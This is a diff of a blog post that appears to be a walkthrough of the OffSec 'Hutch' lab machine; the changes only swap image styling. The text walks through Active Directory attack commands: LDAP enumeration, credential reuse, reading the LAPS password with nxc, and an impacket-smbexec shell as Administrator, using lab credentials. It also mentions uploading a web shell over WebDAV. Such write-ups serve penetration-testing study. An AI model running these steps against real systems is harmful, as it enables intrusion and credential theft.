@@ -56,13 +56,13 @@ For directories: `feroxbuster -u http://hutch.offsec`
 
 Neither of these turn up anything interesting, especially given when we actually check the browser, we see we have a Windows Server landing page for port 80. 
 
-![Hutch1.png](/assets/images/Hutch/Hutch1.png){: .center-aligned width="600px"}
+![Hutch1.png](/assets/images/Hutch/Hutch1.png){: .responsive-image}
 
 No matter, like I said there are a few other commands to check. For the smb server on port 445, we run `smbclient -L \\\\192.168.248.122\\ -N` which does connect but doesn't list shares. We run enum4linux (`enum4linux -a hutch.offsec > enum4linux`) to check if anything stands out, but we don't get much beyond a confirmation of the domain. We do see LDAP is showing on a few ports, so we check ldapsearch, and that shows a bit more interesting stuff: `ldapsearch -x -H ldap://192.168.248.122 -b "dc=hutch,dc=offsec" > ldapsearch`. 
 
 We can `grep` the output for name, userPrincipalName, and perhaps most useful, sAMAccountName:
 
-![Hutch2.png](/assets/images/Hutch/Hutch2.png){: .center-aligned width="600px"}
+![Hutch2.png](/assets/images/Hutch/Hutch2.png){: .responsive-image}
 
 This looks like a pretty good list of users on the back half. We can look around a bit more and confirm Administrator is there as usual as well. So that's pretty helpful, and we can add them all to a users file using cut: `cat ldapsearch | grep sAMAccountName | cut -d : -f 2 > usernames.txt`. We should get rid of everything except Guest (+ Administrator), but it's faster than doing it manually. Usernames.txt now looks like this:
 ```
@@ -85,42 +85,42 @@ fmcsorley
 
 We search through the ldapsearch output a bit more, and we find something else interesting in the description entry for `fmcsorley`: 
 
-![Hutch3.png](/assets/images/Hutch/Hutch3.png){: .center-aligned width="600px"}
+![Hutch3.png](/assets/images/Hutch/Hutch3.png){: .responsive-image}
 
 Could it be a clue?! We can go back over pretty much everything now that we actually have a potential password to test with. We try a few of the same commands with creds now (as well as a few RCE attempts with impacket), and it works with smbclient (We also add `fmcsorley:CrabSharkJellyfish192` to creds.txt):
 
-![Hutch4.png](/assets/images/Hutch/Hutch4.png){: .center-aligned width="600px"}
+![Hutch4.png](/assets/images/Hutch/Hutch4.png){: .responsive-image}
 
 Unfortunately, it seems like both NETLOGON and SYSVOL are empty. Interesting. At that point I decided to just get more information from `bloodhound-python` to see if I could find anything:
 
 `bloodhound-python -u "fmcsorley" -p 'CrabSharkJellyfish192' -d hutch.offsec -c all --zip -ns 192.168.248.122`
 
-![Hutch5.png](/assets/images/Hutch/Hutch5.png){: .center-aligned width="600px"}
+![Hutch5.png](/assets/images/Hutch/Hutch5.png){: .responsive-image}
 
 We can see from clicking around for a little bit that the user we already have access to has the `ReadLAPSPassword` permission. This is 
 
 
 `nxc ldap 192.168.248.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.248.122 -M laps`
 
-![Hutch6.png](/assets/images/Hutch/Hutch6.png){: .center-aligned width="600px"}
+![Hutch6.png](/assets/images/Hutch/Hutch6.png){: .responsive-image}
 
 I didn't actually know which user this password corresponded to, so I ran `nxc` to check against the list of usernames I had access to:`nxc smb 192.168.248.122 -u usernames.txt -p 'z]8oLLqK5vSeD+' -d hutch.offsec --continue-on-success`
 
-![Hutch7.png](/assets/images/Hutch/Hutch7.png){: .center-aligned width="600px"}
+![Hutch7.png](/assets/images/Hutch/Hutch7.png){: .responsive-image}
 
 And it looks like it's the Administrator! Nice, so the only thing left to do is pop a shell and get some flags. I foolishly used impacket-smbexec instead of evil-winrm, but thats how you know I'm not just copy/pasting this from another author: `impacket-smbexec hutch.offsec/Administrator:z]8oLLqK5vSeD+@192.168.248.122`
 
-![Hutch8.png](/assets/images/Hutch/Hutch8.png){: .center-aligned width="600px"}
+![Hutch8.png](/assets/images/Hutch/Hutch8.png){: .responsive-image}
 
 #### Lessons learned
 - I realized that while I got the proof.txt immediately because I got access as Administrator, there actually are two flags on this box. When I tried to use `cd` to look around, I realized that I couldn't because I was using `impacket-smbexec`. So that's a point for `evil-winrm`.
 - Also, in bloodhound make sure to every high value target as high value. In this case the target host wasn't, just the DC, even though I think they are effectively the same. 
 
-![Hutch9.png](/assets/images/Hutch/Hutch9.png){: .center-aligned width="600px"}
+![Hutch9.png](/assets/images/Hutch/Hutch9.png){: .responsive-image}
 
 - I didn't know this, but after reading some other writeups after the fact, it seems that we should notice that there is a webdav share available, and there is a tool called `cadaver` which allows us to access it and treat it much like an FTP server or SMB share. In this case, we are able to put a reverse shell there or at least a web shell. We can then visit it in the browser by going to `http://$target/shell`. 
 
-![Hutch10.png](/assets/images/Hutch/Hutch10.png){: .center-aligned width="600px"}
+![Hutch10.png](/assets/images/Hutch/Hutch10.png){: .responsive-image}
 
 #### Remediation Steps
 - Remove fmcsorley's password from the description. 
